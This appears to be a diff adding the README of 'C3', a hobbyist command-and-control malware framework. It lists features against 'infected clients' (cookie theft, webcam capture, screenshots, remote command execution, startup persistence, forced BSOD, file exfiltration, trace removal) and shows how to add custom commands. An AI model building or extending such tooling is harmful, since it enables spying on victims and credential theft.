@@ -1,0 +1,98 @@
+# C3
+Called it 'C3' because 'C2' is taken by [my previous attempt](https://github.com/objectiveSquid/C2) at a command and control server, which used HTTP requests in a web-gui.<br>
+I started a new project because the old project gave me lung cancer from breathing in all of the shit code.
+
+## Todo
+  1. Kill python interpreter after infection removal in the `self_destruct` double command.<br>
+  2. Remove need for `min_args` and `max_args` when creating a command.<br>
+
+## Commands
+### Double commands (client and server side)
+**kill_proc**: Kills a process on the client<br>
+**launch_exe**: Launches an executable file on the client<br>
+**invoke_bsod**: Invokes a BSOD on the client<br>
+**show_image**: Displays an image on the clients screen<br>
+**screenshot**: Captures a screenshot on client<br>
+**typewrite**: Types a string on the clients keyboard<br>
+**run_command**: Runs a command on the client<br>
+**webcam_img**: Captures an image from the clients webcam<br>
+**add_persistence**: Adds the client infection to PC startup<br>
+**reboot**: Reboots the client PC<br>
+**shutdown**: Turns off the client PC<br>
+**self_destruct**: Self destructs and removes all trace of infection on the client side<br>
+**steal_cookies**: Downloads cookies from the client<br>
+**upload_file**: Uploads a file to the client<br>
+**download_file**: Downloads a file from the client<br>
+**open_url**: Opens a URL in a new webbrowser on the client<br>
+
+### Local commands (server side only)
+**exit**: Removes all clients and exits<br>
+**list_clients**: Lists your infected clients<br>
+**remove_client**: Kills and removes a client<br>
+**rename_client**: Renames a client<br>
+**clear**: Clears the console<br>
+**select**: Selects a client for command execution<br>
+**deselect**: Deselects a client<br>
+**help**: Displays help about command(s)<br>
+
+## Add custom commands
+External modules (such as `threading`, `random`, etc...) should be imported inside the function where they are used.<br>
+### Double commands
+Double commands should be implemented in the `shared/double_commands.py` file, since the required imports for creating a double command is already imported.
+In an actual double command you would catch potential errors in the `server_side` and return them like this:<br>
+`return CommandResult(DoubleCommandResult.your_error_here)`
+Here is how you can implement a custom double command:<br>
+```py
+@add_double_command(
+    "my_double_command",
+    "Usage [ required argument ] { optional argument }",
+    "A cool double command!",
+    min_args=1,
+    max_args=2,
+    argument_types=[
+        ArgumentType.integer,
+        ArgumentType.optional_string,
+    ],
+)
+class MyDoubleCommand(DoubleCommand):
+    @staticmethod
+    def client_side(sock):
+        data = sock.recv(512)
+        print(data.decode())
+
+    @staticmethod
+    def server_side(client, params):
+        tmp_sock = client.create_temp_socket(blocking=True, timeout=5)
+
+        tmp_sock.sendall(f"(required) Integer argument (1): {params[0]}\n".encode())
+        if len(params) == 2:
+            tmp_sock.sendall(f"(optional) String argument (2): {params[1]}\n".encode())
+
+        return CommandResult(LocalCommandResult.success)
+```
+### Local commands
+Local commands should be implemented in the `server_extras/local_commands.py` file, since the required imports for creating a local command is already imported.
+In an actual local command you would catch potential errors in the `local_side` and return them like this:<br>
+`return CommandResult(LocalCommandResult.your_error_here)`
+Here is how you can implement a custom local command:<br>
+```py
+@add_local_command(
+    "my_local_command",
+    "Usage [ required argument ] { optional argument }",
+    "A cool local command!",
+    min_args=1,
+    max_args=2,
+    argument_types=[
+        shared.extras.double_command.ArgumentType.integer,
+        shared.extras.double_command.ArgumentType.optional_string,
+    ],
+)
+class MyLocalCommand(LocalCommand):
+    @staticmethod
+    def local_side(server_thread, params):
+        print(f"(required) Integer argument (1): {params[0]}")
+        if len(params) == 2:
+            print(f"(optional) String argument (2): {params[1]}")
+
+        return CommandResult(LocalCommandResult.success)
+```
